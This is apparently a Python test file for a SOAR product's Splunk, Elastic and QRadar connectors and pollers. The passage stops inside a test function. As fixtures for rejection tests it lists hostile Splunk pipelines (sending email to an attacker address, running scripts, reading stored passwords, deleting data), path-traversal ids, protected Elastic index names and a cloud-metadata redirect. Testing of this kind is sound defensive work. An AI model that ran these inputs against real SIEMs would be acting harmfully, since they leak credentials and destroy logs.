"""Splunk and Elastic connectors and the Splunk / Elastic / QRadar SIEM pollers.

Documented requests (method, path, headers, body) through the pinned
transport, the either-or credential rule, refusals before any request, and
pollers that are pinned, never honour the removed TLS opt-out and reach a
private SIEM only when the operator allow-lists its network.

Vendor HTTP is faked at the network boundary (tests/unit/connector_fakes.py);
the fake bodies follow the response shapes in the Splunk REST API reference,
the Elasticsearch REST API reference and the QRadar API reference. No live
Splunk, Elastic or QRadar was used.
"""

# ruff: noqa: ARG001, ARG005  (fake vendor handlers mirror the httpx / netguard signatures)
from __future__ import annotations

import base64
import json
from typing import Any

import httpx
import pytest
from sqlalchemy import select

from src.core.config import settings
from src.integrations.engine import (
    CONNECTOR_CLASS_MAP,
    IMPLEMENTED,
    INGEST_CONNECTORS,
    LOG_INGEST,
    ConnectorRegistry,
    implementation_status,
    invalid_install_fields,
    missing_install_fields,
)
from src.integrations.models import InstalledIntegration
from src.integrations.netguard import PRIVATE_TARGET_HINT
from src.siem import cloud_poller
from tests.unit.connector_fakes import PUBLIC_IP, VALID_FIELDS, fake_vendor, host_header

BASE = "/api/v1/integrations"
SPLUNK_TOKEN = "splunk-fixture-token-0001"
ES_KEY = "es-fixture-apikey-0001"
QRADAR_TOKEN = "qradar-fixture-sec-0001"
PRIVATE_IP = "10.20.0.5"


def _connector(name: str, config: dict[str, Any] | None = None, credentials: dict[str, Any] | None = None):
    base_config, base_creds = VALID_FIELDS[name]
    return CONNECTOR_CLASS_MAP[name](
        config={**base_config, **(config or {})},
        credentials=dict(base_creds) if credentials is None else credentials,
    )


def _form(request: httpx.Request) -> dict[str, str]:
    return dict(httpx.QueryParams(request.content.decode()))


def _json(request: httpx.Request) -> Any:
    return json.loads(request.content.decode()) if request.content else None


def _refuse_everything(request: httpx.Request) -> httpx.Response:
    raise AssertionError(f"no request expected, got {request.method} {request.url}")


def _basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


# --------------------------------------------------------------------------
# Catalogue
# --------------------------------------------------------------------------


def test_status_and_ingest_flags() -> None:
    assert implementation_status("splunk") == IMPLEMENTED and implementation_status("elastic") == IMPLEMENTED
    assert implementation_status("qradar") == LOG_INGEST
    registry = ConnectorRegistry()
    for name in ("aws_cloudtrail", "azure_activity_log", "gcp_cloud_logging", "qradar", "splunk", "elastic"):
        assert registry.connectors[name]["ingest"] is True, name
        assert registry.connectors[name]["installable"] is True, name
    assert registry.connectors["jira"]["ingest"] is False
    # The ingest flag is the poller dispatch table, not a hand-kept list.
    assert INGEST_CONNECTORS == set(cloud_poller._CLOUD_CONNECTOR_DISPATCH) & set(registry.connectors)
    qradar = registry.connectors["qradar"]
    assert qradar["actions"] == [] and qradar["test_call"] is None
    assert [(f["name"], f["required"], f["secret"]) for f in qradar["config_fields"]] == [("base_url", True, False)]
    assert [(f["name"], f["secret"]) for f in qradar["credential_fields"]] == [("sec_token", True)]
    assert not hasattr(cloud_poller, "_tls_verify")


@pytest.mark.asyncio
async def test_catalogue_route_reports_ingest(client, org_a_admin_headers) -> None:
    resp = await client.get(f"{BASE}/connectors", params={"size": 100}, headers=org_a_admin_headers)
    items = {c["name"]: c for c in resp.json()["items"]}
    assert items["splunk"]["implementation_status"] == "implemented" and items["splunk"]["ingest"] is True
    assert items["elastic"]["implementation_status"] == "implemented" and items["elastic"]["ingest"] is True
    assert items["qradar"]["implementation_status"] == "log_ingest" and items["qradar"]["ingest"] is True
    assert items["virustotal"]["ingest"] is False


# --------------------------------------------------------------------------
# Fields: the either-or credential rule and URL validation
# --------------------------------------------------------------------------


@pytest.mark.parametrize(("name", "key"), [("splunk", "token"), ("elastic", "api_key")])
def test_either_or_credentials(name: str, key: str) -> None:
    config = VALID_FIELDS[name][0]
    assert missing_install_fields(name, config, {}) == [key, "username", "password"]
    assert missing_install_fields(name, config, {"username": "svc"}) == ["password"]
    assert missing_install_fields(name, config, {"password": "pw-fixture"}) == ["username"]
    assert missing_install_fields(name, config, {"username": "svc", "password": "pw-fixture"}) == []
    assert missing_install_fields(name, config, {key: "k-fixture"}) == []
    assert missing_install_fields(name, {}, {key: "k-fixture"}) == ["base_url"]
    assert not _connector(name, credentials={}).is_configured


@pytest.mark.parametrize("name", ["splunk", "elastic"])
@pytest.mark.parametrize("url", [
    "http://siem.acme.example", "https://user:pw@siem.acme.example", "https://siem.acme.example/api",
    "https://siem.acme.example?x=1", "ftp://siem.acme.example", "https://", "https://siem.acme.example:99999",
])
def test_base_url_must_be_an_https_origin(name: str, url: str) -> None:
    creds = VALID_FIELDS[name][1]
    assert invalid_install_fields(name, {"base_url": url}, creds) == ["base_url"]
    assert invalid_install_fields(name, {"base_url": "https://siem.acme.example:8089/"}, creds) == []


def test_other_field_formats() -> None:
    assert invalid_install_fields("splunk", {**VALID_FIELDS["splunk"][0], "hec_url": "http://hec.acme.example"}, {}) == ["hec_url"]
    es = VALID_FIELDS["elastic"][0]
    assert invalid_install_fields("elastic", {**es, "index": "_internal"}, {}) == ["index"]
    assert invalid_install_fields("elastic", {**es, "timestamp_field": "a b"}, {}) == ["timestamp_field"]
    assert invalid_install_fields("elastic", {**es, "index": "logs-*", "timestamp_field": "event.created"}, {}) == []
    assert invalid_install_fields("qradar", {"base_url": "http://qradar.acme.example"}, {}) == ["base_url"]
    assert missing_install_fields("qradar", {}, {}) == ["base_url", "sec_token"]


@pytest.mark.asyncio
@pytest.mark.parametrize("name", ["splunk", "elastic"])
async def test_install_refuses_neither_credential(client, org_a_admin_headers, org_a_headers, name: str) -> None:
    config, credentials = VALID_FIELDS[name]
    missing = await client.post(
        f"{BASE}/install", json={"connector_id": name, "display_name": name, "config": config, "credentials": {}},
        headers=org_a_admin_headers,
    )
    assert missing.status_code == 422
    detail = missing.json()["detail"]
    assert detail["error"] == "missing_fields" and "username" in detail["fields"] and "password" in detail["fields"]

    ok = await client.post(
        f"{BASE}/install", json={"connector_id": name, "display_name": name, "config": config, "credentials": credentials},
        headers=org_a_admin_headers,
    )
    assert ok.status_code == 201, ok.text
    assert credentials[next(iter(credentials))] not in ok.text
    actions = await client.get(f"{BASE}/installed/{ok.json()['id']}/actions", headers=org_a_headers)
    assert {a["action_name"] for a in actions.json()["items"]} == set(CONNECTOR_CLASS_MAP[name].ACTIONS)


@pytest.mark.asyncio
async def test_qradar_installs_with_its_poller_fields(client, org_a_admin_headers, org_a_headers) -> None:
    missing = await client.post(
        f"{BASE}/install", json={"connector_id": "qradar", "display_name": "QRadar", "credentials": {}},
        headers=org_a_admin_headers,
    )
    assert missing.status_code == 422 and missing.json()["detail"]["fields"] == ["base_url", "sec_token"]
    invalid = await client.post(
        f"{BASE}/install",
        json={"connector_id": "qradar", "display_name": "QRadar", "config": {"base_url": "http://qradar.acme.example"},
              "credentials": {"sec_token": QRADAR_TOKEN}},
        headers=org_a_admin_headers,
    )
    assert invalid.status_code == 422 and invalid.json()["detail"] == {
        "error": "invalid_fields", "fields": ["base_url"], "detail": "config / credential fields have an invalid format",
    }
    ok = await client.post(
        f"{BASE}/install",
        json={"connector_id": "qradar", "display_name": "QRadar", "config": {"base_url": "https://qradar.acme.example"},
              "credentials": {"sec_token": QRADAR_TOKEN}},
        headers=org_a_admin_headers,
    )
    assert ok.status_code == 201, ok.text and QRADAR_TOKEN not in ok.text
    test = await client.post(f"{BASE}/installed/{ok.json()['id']}/test", headers=org_a_headers)
    assert test.status_code == 501 and "SIEM cloud poller" in test.json()["detail"]["detail"]


# --------------------------------------------------------------------------
# Connection tests
# --------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_splunk_connection_healthy(monkeypatch) -> None:
    body = {"entry": [{"name": "server-info", "content": {"version": "9.2.1", "serverName": "idx-1"}}]}
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json=body))
    result = await _connector("splunk", config={"base_url": "https://splunk.acme.example:8089"}).test_connection()
    assert result.status == "healthy" and "Splunk 9.2.1 on idx-1" in result.detail
    (request,) = seen
    assert request.method == "GET" and request.url.path == "/services/server/info"
    assert request.url.params["output_mode"] == "json"
    assert request.url.host == PUBLIC_IP and request.url.port == 8089
    assert host_header(request) == "splunk.acme.example:8089"
    assert request.extensions["sni_hostname"] == "splunk.acme.example"
    assert request.headers["authorization"] == f"Bearer {SPLUNK_TOKEN}"


@pytest.mark.asyncio
async def test_elastic_connection_healthy_with_basic_auth(monkeypatch) -> None:
    body = {"name": "es-1", "cluster_name": "soc", "version": {"number": "8.13.0"}}
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json=body))
    result = await _connector("elastic", credentials={"username": "svc-soar", "password": "es-fixture-pass-0001"}).test_connection()
    assert result.status == "healthy" and "cluster soc on Elasticsearch 8.13.0" in result.detail
    (request,) = seen
    assert request.method == "GET" and request.url.path == "/"
    assert request.headers["authorization"] == _basic("svc-soar", "es-fixture-pass-0001")
    assert "es-fixture-pass-0001" not in json.dumps(result.to_dict())


@pytest.mark.asyncio
@pytest.mark.parametrize(("name", "secret"), [("splunk", SPLUNK_TOKEN), ("elastic", ES_KEY)])
async def test_connection_401_is_unhealthy_without_secret(monkeypatch, name: str, secret: str) -> None:
    fake_vendor(monkeypatch, lambda request: httpx.Response(401, json={"messages": [{"type": "WARN", "text": f"bad {secret}"}]}))
    result = await _connector(name).test_connection()
    assert result.status == "unhealthy" and result.http_status == 401 and "401" in result.detail
    assert secret not in json.dumps(result.to_dict())


@pytest.mark.asyncio
async def test_elastic_200_without_cluster_name_is_unhealthy(monkeypatch) -> None:
    fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"ok": True}))
    result = await _connector("elastic").test_connection()
    assert result.status == "unhealthy" and "cluster_name" in result.detail


# --------------------------------------------------------------------------
# Splunk actions
# --------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_splunk_actions_documented_requests(monkeypatch) -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == "/services/search/v2/jobs":
            return httpx.Response(200, json={"results": [{"_raw": "login failed", "src_ip": "198.51.100.7"}]})
        if path == "/services/saved/searches":
            return httpx.Response(200, json={"entry": [{"name": "Failed logons", "content": {
                "search": "index=auth action=failure", "is_scheduled": True, "cron_schedule": "*/5 * * * *", "disabled": False}}]})
        if path.endswith("/dispatch"):
            return httpx.Response(201, json={"sid": "scheduler__admin__search__RMD5f00d_at_1700000000_1"})
        if path.startswith("/services/search/v2/jobs/") and path.endswith("/results"):
            return httpx.Response(200, json={"results": [{"count": "3"}]})
        return httpx.Response(404, json={"messages": [{"type": "ERROR", "text": "not found"}]})

    seen = fake_vendor(monkeypatch, handler)
    splunk = _connector("splunk")

    out = await splunk.execute_action("search", {"search": "index=auth action=failure", "earliest_time": "-15m", "max_count": 50})
    assert out["count"] == 1 and out["results"][0]["src_ip"] == "198.51.100.7"
    search_req = seen[-1]
    assert search_req.method == "POST" and search_req.url.path == "/services/search/v2/jobs"
    assert search_req.headers["content-type"].startswith("application/x-www-form-urlencoded")
    form = _form(search_req)
    assert form == {
        "search": "search index=auth action=failure", "exec_mode": "oneshot", "output_mode": "json",
        "max_count": "50", "count": "50", "earliest_time": "-15m",
    }
    assert search_req.headers["authorization"] == f"Bearer {SPLUNK_TOKEN}"

    piped = await splunk.execute_action("search", {"search": "| tstats count where index=auth"})
    assert piped["count"] == 1 and _form(seen[-1])["search"] == "| tstats count where index=auth"

    listed = await splunk.execute_action("list_saved_searches", {"count": 20})
    assert listed["saved_searches"][0]["name"] == "Failed logons"
    assert seen[-1].method == "GET" and dict(seen[-1].url.params) == {"output_mode": "json", "count": "20"}

    run = await splunk.execute_action("run_saved_search", {"name": "Failed logons"})
    assert run["sid"].startswith("scheduler__admin")
    dispatch = seen[-1]
    assert dispatch.method == "POST"
    assert dispatch.url.raw_path.decode() == "/services/saved/searches/Failed%20logons/dispatch"
    assert _form(dispatch) == {"output_mode": "json"}

    results = await splunk.execute_action("get_job_results", {"sid": "1700000000.42", "count": 5})
    assert results == {"sid": "1700000000.42", "count": 1, "results": [{"count": "3"}]}
    assert seen[-1].method == "GET" and seen[-1].url.path == "/services/search/v2/jobs/1700000000.42/results"
    assert dict(seen[-1].url.params) == {"output_mode": "json", "count": "5"}


@pytest.mark.asyncio
async def test_splunk_hec_send_event(monkeypatch) -> None:
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"text": "Success", "code": 0}))
    splunk = _connector(
        "splunk", config={"hec_url": "https://hec.acme.example:8088"},
        credentials={"token": SPLUNK_TOKEN, "hec_token": "hec-fixture-token-0001"},
    )
    out = await splunk.execute_action("hec_send_event", {
        "event": {"action": "isolate", "host": "ws-17"}, "sourcetype": "pysoar:action", "index": "soar", "time": 1700000000.5,
    })
    assert out == {"text": "Success", "code": 0}
    (request,) = seen
    assert request.method == "POST" and request.url.path == "/services/collector/event"
    assert host_header(request) == "hec.acme.example:8088" and request.url.host == PUBLIC_IP
    assert request.headers["authorization"] == "Splunk hec-fixture-token-0001"
    assert _json(request) == {"event": {"action": "isolate", "host": "ws-17"}, "time": 1700000000.5, "sourcetype": "pysoar:action", "index": "soar"}

    fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"text": "Invalid data format", "code": 6}))
    refused = await splunk.execute_action("hec_send_event", {"event": "x"})
    assert refused["status"] == "failed" and "Invalid data format" in refused["error"]


@pytest.mark.asyncio
async def test_splunk_hec_needs_its_settings(monkeypatch) -> None:
    fake_vendor(monkeypatch, _refuse_everything)
    out = await _connector("splunk").execute_action("hec_send_event", {"event": "x"})
    assert out["status"] == "failed" and out["code"] == "invalid_parameters"
    assert "hec_url" in out["error"] and "hec_token" in out["error"]
    only_url = _connector("splunk", config={"hec_url": "https://hec.acme.example"})
    assert (await only_url.execute_action("hec_send_event", {"event": "x"}))["status"] == "failed"


@pytest.mark.asyncio
@pytest.mark.parametrize(("action", "params"), [
    ("get_job_results", {"sid": "../../services/authentication/users"}),
    ("get_job_results", {"sid": "a/b"}),
    ("get_job_results", {"sid": ".."}),
    ("get_job_results", {"sid": "a?b"}),
    ("run_saved_search", {"name": "../../apps/local"}),
    ("run_saved_search", {"name": ".."}),
    ("run_saved_search", {"name": "a%2fb"}),
    ("search", {"search": "   "}),
])
async def test_splunk_ids_refused_before_any_request(monkeypatch, action: str, params: dict[str, Any]) -> None:
    fake_vendor(monkeypatch, _refuse_everything)
    out = await _connector("splunk").execute_action(action, params)
    assert out["status"] == "failed" and out["code"] == "invalid_parameters"


@pytest.mark.asyncio
async def test_splunk_vendor_error_is_failed_with_status(monkeypatch) -> None:
    # An allow-listed pipeline the vendor still rejects (a non-allow-listed
    # command never reaches the vendor: see the read-only tests above).
    fake_vendor(monkeypatch, lambda request: httpx.Response(400, json={"messages": [{"type": "FATAL", "text": "Error in 'stats' command: invalid argument"}]}))
    out = await _connector("splunk").execute_action("search", {"search": "index=x | stats count by"})
    assert out["status"] == "failed" and out["http_status"] == 400


# --------------------------------------------------------------------------
# Elastic actions
# --------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_elastic_actions_documented_requests(monkeypatch) -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path.endswith("/_search"):
            return httpx.Response(200, json={"hits": {"total": {"value": 1, "relation": "eq"}, "hits": [
                {"_index": "logs-auth", "_id": "a1", "_score": 1.0, "_source": {"event": {"action": "logon"}}}]}})
        if path.endswith("/_count"):
            return httpx.Response(200, json={"count": 42, "_shards": {"total": 1}})
        if "/_doc/" in path:
            return httpx.Response(200, json={"_index": "logs-auth", "_id": "a1", "_version": 3, "found": True, "_source": {"user": "jdoe"}})
        if path == "/_cat/indices":
            return httpx.Response(200, json=[{"index": "logs-auth", "health": "green", "status": "open", "docs.count": "42", "store.size": "1mb"}])
        if path == "/_cluster/health":
            return httpx.Response(200, json={"cluster_name": "soc", "status": "green", "number_of_nodes": 3})
        if path.endswith("/_doc"):
            return httpx.Response(201, json={"_index": "soar-actions", "_id": "Xy1", "result": "created", "_version": 1})
        return httpx.Response(404, json={"error": {"type": "index_not_found_exception"}, "status": 404})

    seen = fake_vendor(monkeypatch, handler)
    es = _connector("elastic")

    query = {"match": {"event.action": "logon"}}
    out = await es.execute_action("search", {"index": "logs-*", "query": query, "size": 5, "sort": [{"@timestamp": "desc"}], "_source": ["event"]})
    assert out["total"] == 1 and out["hits"][0] == {"index": "logs-auth", "id": "a1", "score": 1.0, "source": {"event": {"action": "logon"}}}
    request = seen[-1]
    assert request.method == "POST" and request.url.path == "/logs-*/_search"
    assert _json(request) == {"size": 5, "query": query, "sort": [{"@timestamp": "desc"}], "_source": ["event"]}
    assert request.headers["authorization"] == f"ApiKey {ES_KEY}"
    assert host_header(request) == "es.acme.example"

    counted = await es.execute_action("count", {"index": "logs-auth", "query": query})
    assert counted == {"index": "logs-auth", "count": 42}
    assert seen[-1].method == "POST" and seen[-1].url.path == "/logs-auth/_count" and _json(seen[-1]) == {"query": query}

    doc = await es.execute_action("get_document", {"index": "logs-auth", "id": "a1"})
    assert doc["found"] is True and doc["source"] == {"user": "jdoe"}
    assert seen[-1].method == "GET" and seen[-1].url.path == "/logs-auth/_doc/a1"

    indices = await es.execute_action("list_indices", {})
    assert indices["count"] == 1 and indices["indices"][0]["health"] == "green"
    assert dict(seen[-1].url.params) == {"format": "json", "h": "index,health,status,docs.count,store.size"}

    health = await es.execute_action("cluster_health", {})
    assert health["status"] == "green" and seen[-1].url.path == "/_cluster/health"

    created = await es.execute_action("index_document", {"index": "soar-actions", "document": {"action": "isolate"}})
    assert created == {"index": "soar-actions", "id": "Xy1", "result": "created", "version": 1}
    assert seen[-1].method == "POST" and seen[-1].url.path == "/soar-actions/_doc" and _json(seen[-1]) == {"action": "isolate"}


@pytest.mark.asyncio
@pytest.mark.parametrize(("action", "params"), [
    ("search", {"index": "_all"}),
    ("search", {"index": "-logs"}),
    ("search", {"index": "+logs"}),
    ("search", {"index": "Logs"}),
    ("search", {"index": "logs/../_security"}),
    ("search", {"index": "logs,_security"}),
    ("count", {"index": "logs?x=1"}),
    ("get_document", {"index": "logs-*", "id": "a1"}),
    ("get_document", {"index": "logs", "id": "../_security/user"}),
    ("get_document", {"index": "logs", "id": ".."}),
    ("index_document", {"index": "logs-*", "document": {}}),
    ("index_document", {"index": "_security", "document": {}}),
])
async def test_elastic_names_refused_before_any_request(monkeypatch, action: str, params: dict[str, Any]) -> None:
    fake_vendor(monkeypatch, _refuse_everything)
    out = await _connector("elastic").execute_action(action, params)
    assert out["status"] == "failed" and out["code"] == "invalid_parameters", out


# --------------------------------------------------------------------------
# Private targets and the operator allow-list
# --------------------------------------------------------------------------


@pytest.mark.asyncio
@pytest.mark.parametrize("name", ["splunk", "elastic"])
async def test_private_siem_refused_with_the_setting_named_until_allowlisted(monkeypatch, name: str) -> None:
    monkeypatch.setattr(settings, "outbound_private_allowlist", [])
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={
        "entry": [{"content": {"version": "9.2.1"}}], "cluster_name": "soc", "version": {"number": "8.13.0"}}), ip=PRIVATE_IP)
    refused = await _connector(name).test_connection()
    assert refused.status == "unhealthy" and seen == []
    assert refused.detail == f"refused: {PRIVATE_TARGET_HINT}"
    assert PRIVATE_IP not in refused.detail

    monkeypatch.setattr(settings, "outbound_private_allowlist", ["10.20.0.0/16"])
    allowed = await _connector(name).test_connection()
    assert allowed.status == "healthy", allowed
    assert len(seen) == 1 and seen[0].url.host == PRIVATE_IP


@pytest.mark.asyncio
async def test_metadata_address_refused_even_when_listed(monkeypatch) -> None:
    monkeypatch.setattr(settings, "outbound_private_allowlist", ["169.254.0.0/16", "0.0.0.0/0"])
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={}), ip="169.254.169.254")
    result = await _connector("splunk").test_connection()
    assert result.status == "unhealthy" and result.detail == "refused: target resolves to an internal address"
    assert seen == []


# --------------------------------------------------------------------------
# Pollers
# --------------------------------------------------------------------------


async def _row(db, org_id: str, connector: str, config: dict[str, Any], credentials: dict[str, Any]) -> InstalledIntegration:
    from src.core.secrets import _encrypt_secret_json
    from tests.unit.connector_fakes import ensure_connector_rows

    await ensure_connector_rows(db, connector)
    row = InstalledIntegration(
        organization_id=org_id, connector_id=connector, display_name=connector,
        config_encrypted=json.dumps(config), auth_credentials_encrypted=_encrypt_secret_json(credentials),
        status="active",
    )
    db.add(row)
    await db.commit()
    return row


SPLUNK_RESULTS = {"results": [
    {"_raw": "Failed password for root", "src_ip": "198.51.100.7", "host": "web-1"},
    {"_raw": "Accepted publickey for deploy", "src_ip": "198.51.100.8", "host": "web-2"},
]}


@pytest.mark.asyncio
async def test_splunk_poller_refuses_private_host_until_allowlisted(db_session, org_a, monkeypatch) -> None:
    org_id = org_a.id
    monkeypatch.setattr(settings, "outbound_private_allowlist", [])
    row = await _row(
        db_session, org_id, "splunk",
        {"base_url": "https://splunk.corp.example:8089", "verify_tls": False, "ca_bundle": "/tmp/ca.pem"},
        {"token": SPLUNK_TOKEN},
    )
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json=SPLUNK_RESULTS), ip=PRIVATE_IP)

    refused = await cloud_poller.poll_splunk(db_session, row)
    assert refused["status"] == "error" and seen == []
    assert row.health_status == "unhealthy"
    assert "OUTBOUND_PRIVATE_ALLOWLIST" in row.error_message
    assert cloud_poller.TLS_OPT_OUT_IGNORED in row.error_message
    assert SPLUNK_TOKEN not in row.error_message and PRIVATE_IP not in row.error_message

    monkeypatch.setattr(settings, "outbound_private_allowlist", ["10.20.0.0/24"])
    polled = await cloud_poller.poll_splunk(db_session, row)
    assert polled["status"] == "ok" and polled["events_fetched"] == 2 and polled["events_ingested"] == 2
    assert polled["note"] == cloud_poller.TLS_OPT_OUT_IGNORED
    (request,) = seen
    assert request.method == "POST" and request.url.path == "/services/search/v2/jobs"
    assert request.url.host == PRIVATE_IP and host_header(request) == "splunk.corp.example:8089"
    assert request.extensions["sni_hostname"] == "splunk.corp.example"
    form = _form(request)
    assert form["search"] == "search index=*" and form["exec_mode"] == "oneshot"
    assert form["earliest_time"].isdigit() and form["latest_time"].isdigit()
    assert request.headers["authorization"] == f"Bearer {SPLUNK_TOKEN}"
    assert row.health_status == "healthy" and row.error_message == cloud_poller.TLS_OPT_OUT_IGNORED
    assert "last_poll_at" in json.loads(row.config_encrypted)

    from src.siem.models import LogEntry

    logs = (await db_session.execute(select(LogEntry).where(LogEntry.organization_id == org_id))).scalars().all()
    assert len(logs) == 2 and {entry.source_type for entry in logs} == {"splunk"}


@pytest.mark.asyncio
async def test_poller_uses_the_pinned_client_and_verifies_tls(db_session, org_a, monkeypatch) -> None:
    """A stored verify_tls: false never reaches the HTTP layer."""
    made: list[dict[str, Any]] = []

    def _transport(*args: Any, **kwargs: Any):
        made.append(kwargs)
        return httpx.MockTransport(lambda request: httpx.Response(200, json={"hits": {"hits": [{"_source": {"message": "x"}}]}}))

    async def _resolve(host: str, port: int):
        import socket

        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (PUBLIC_IP, port))]

    from src.integrations import netguard

    monkeypatch.setattr(netguard, "_getaddrinfo", _resolve)
    monkeypatch.setattr(httpx, "AsyncHTTPTransport", _transport)
    row = await _row(
        db_session, org_a.id, "elastic",
        {"base_url": "https://es.acme.example", "verify_tls": False, "index": "logs-auth", "timestamp_field": "event.created"},
        {"api_key": ES_KEY},
    )
    out = await cloud_poller.poll_elastic(db_session, row)
    assert out["status"] == "ok" and out["events_fetched"] == 1
    assert made and all("verify" not in kwargs or kwargs["verify"] is not False for kwargs in made)


@pytest.mark.asyncio
async def test_elastic_poller_window_query(db_session, org_a, monkeypatch) -> None:
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"hits": {"total": {"value": 1}, "hits": [
        {"_index": "logs-auth", "_id": "1", "_source": {"event": {"action": "logon"}, "source": {"ip": "198.51.100.9"}}}]}}))
    row = await _row(
        db_session, org_a.id, "elastic",
        {"base_url": "https://es.acme.example", "index": "logs-auth", "timestamp_field": "event.created"},
        {"username": "svc-soar", "password": "es-fixture-pass-0001"},
    )
    out = await cloud_poller.poll_elastic(db_session, row)
    assert out["status"] == "ok" and out["events_ingested"] == 1 and "note" not in out
    (request,) = seen
    assert request.method == "POST" and request.url.path == "/logs-auth/_search"
    body = _json(request)
    assert body["size"] == 500 and body["sort"] == [{"event.created": "asc"}]
    assert set(body["query"]["range"]["event.created"]) == {"gte", "lte"}
    assert request.headers["authorization"] == _basic("svc-soar", "es-fixture-pass-0001")
    assert row.health_status == "healthy" and row.error_message is None


@pytest.mark.asyncio
async def test_poller_records_vendor_rejection_without_secret(db_session, org_a, monkeypatch) -> None:
    fake_vendor(monkeypatch, lambda request: httpx.Response(401, json={"messages": [{"text": f"bad token {SPLUNK_TOKEN}"}]}))
    row = await _row(db_session, org_a.id, "splunk", {"base_url": "https://splunk.acme.example"}, {"token": SPLUNK_TOKEN})
    out = await cloud_poller.poll_splunk(db_session, row)
    assert out["status"] == "error" and row.health_status == "unhealthy"
    assert row.error_message == "authentication rejected (HTTP 401)"


@pytest.mark.asyncio
async def test_splunk_poller_legacy_row_with_base_url_in_credentials(db_session, org_a, monkeypatch) -> None:
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"results": []}))
    row = await _row(db_session, org_a.id, "splunk", {}, {"base_url": "https://splunk.acme.example", "token": SPLUNK_TOKEN})
    out = await cloud_poller.poll_splunk(db_session, row)
    assert out["status"] == "ok" and out["events_fetched"] == 0
    assert host_header(seen[0]) == "splunk.acme.example"


@pytest.mark.asyncio
async def test_poller_with_missing_credential_polls_nothing(db_session, org_a, monkeypatch) -> None:
    fake_vendor(monkeypatch, _refuse_everything)
    row = await _row(db_session, org_a.id, "elastic", {"base_url": "https://es.acme.example"}, {"username": "svc"})
    out = await cloud_poller.poll_elastic(db_session, row)
    assert out["status"] == "error" and row.health_status == "unhealthy" and "password" in row.error_message


@pytest.mark.asyncio
async def test_qradar_poller_pinned_and_allowlist(db_session, org_a, monkeypatch) -> None:
    offenses = [{"id": 101, "description": "Multiple login failures", "start_time": 1700000000000, "source_address_ids": [7]}]
    monkeypatch.setattr(settings, "outbound_private_allowlist", [])
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json=offenses), ip=PRIVATE_IP)
    row = await _row(
        db_session, org_a.id, "qradar",
        {"base_url": "https://qradar.corp.example", "verify_tls": False},
        {"sec_token": QRADAR_TOKEN},
    )
    refused = await cloud_poller.poll_qradar(db_session, row)
    assert refused["status"] == "error" and seen == []
    assert row.error_message == f"refused: {PRIVATE_TARGET_HINT}; {cloud_poller.TLS_OPT_OUT_IGNORED}"

    monkeypatch.setattr(settings, "outbound_private_allowlist", ["10.0.0.0/8"])
    polled = await cloud_poller.poll_qradar(db_session, row)
    assert polled["status"] == "ok" and polled["events_fetched"] == 1 and polled["note"] == cloud_poller.TLS_OPT_OUT_IGNORED
    (request,) = seen
    assert request.method == "GET" and request.url.path == "/api/siem/offenses"
    assert request.url.host == PRIVATE_IP and host_header(request) == "qradar.corp.example"
    assert request.extensions["sni_hostname"] == "qradar.corp.example"
    assert request.headers["sec"] == QRADAR_TOKEN and request.headers["version"] == "12.0"
    assert request.headers["range"] == "items=0-499"
    assert request.url.params["filter"].startswith("start_time>=")
    assert row.health_status == "healthy"


@pytest.mark.asyncio
async def test_qradar_poller_does_not_follow_redirects(db_session, org_a, monkeypatch) -> None:
    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data"}))
    row = await _row(db_session, org_a.id, "qradar", {"base_url": "https://qradar.acme.example"}, {"sec_token": QRADAR_TOKEN})
    out = await cloud_poller.poll_qradar(db_session, row)
    assert out["status"] == "error" and len(seen) == 1 and row.error_message == "HTTP 302"


@pytest.mark.asyncio
async def test_qradar_poller_401(db_session, org_a, monkeypatch) -> None:
    fake_vendor(monkeypatch, lambda request: httpx.Response(401, json={"message": f"token {QRADAR_TOKEN} invalid"}))
    row = await _row(db_session, org_a.id, "qradar", {"base_url": "https://qradar.acme.example"}, {"sec_token": QRADAR_TOKEN})
    out = await cloud_poller.poll_qradar(db_session, row)
    assert out["status"] == "error" and row.error_message == "authentication rejected (HTTP 401)"


@pytest.mark.asyncio
@pytest.mark.parametrize("spl", [
    "index=main | delete",
    "| collect index=summary",
    "search sourcetype=auth | outputlookup evil.csv",
    "index=main | sendemail to=attacker@example.com",
    "| script python exfil",
    "| rest /services/storage/passwords",
    "index=main [ search index=x | delete ]",
    "index=main |OUTPUTCSV dump",
    "| savedsearch \"Nightly alert\"",
    "index=main | `exfil_macro`",
    "index=main | mycustomcommand arg=1",
    "index=main | stats count | ",
    "index=main [delete]",                                   # subsearch opened mid-segment
    "index=main | stats count [ | delete ]",
    "index=main [ search index=y [ | collect index=z ] ]",   # nested
    "| from savedsearch:\"Nightly purge\"",                  # runs a saved search
    "| from savedsearch:nightly",
    "| loadjob 1697000000.123",
    "| history",
    "| metadata type=hosts",
    'index=main | eval note="unterminated | stats count',
    'search a=\\" | delete | eval x="y\\" z"',                 # backslash outside quotes
    'index=main foo\\" [ | collect index=z ] x="q\\" r"',
    'index=main | eval p="C:\\\\temp" | rex "\\d+" | delete',   # escapes inside quotes still scan the rest
])
async def test_splunk_search_refuses_state_changing_spl(monkeypatch, spl: str) -> None:
    """The ``search`` action is declared read-only (analysts can run it), so a
    pipeline that would change Splunk state, run code or read Splunk's own
    configuration never reaches the vendor."""
    fake_vendor(monkeypatch, _refuse_everything)
    out = await _connector("splunk").execute_action("search", {"search": spl})
    assert out["status"] == "failed" and out["code"] == "invalid_parameters"
    assert "read-only" in out["error"]


@pytest.mark.asyncio
async def test_splunk_search_allows_read_only_pipelines(monkeypatch) -> None:
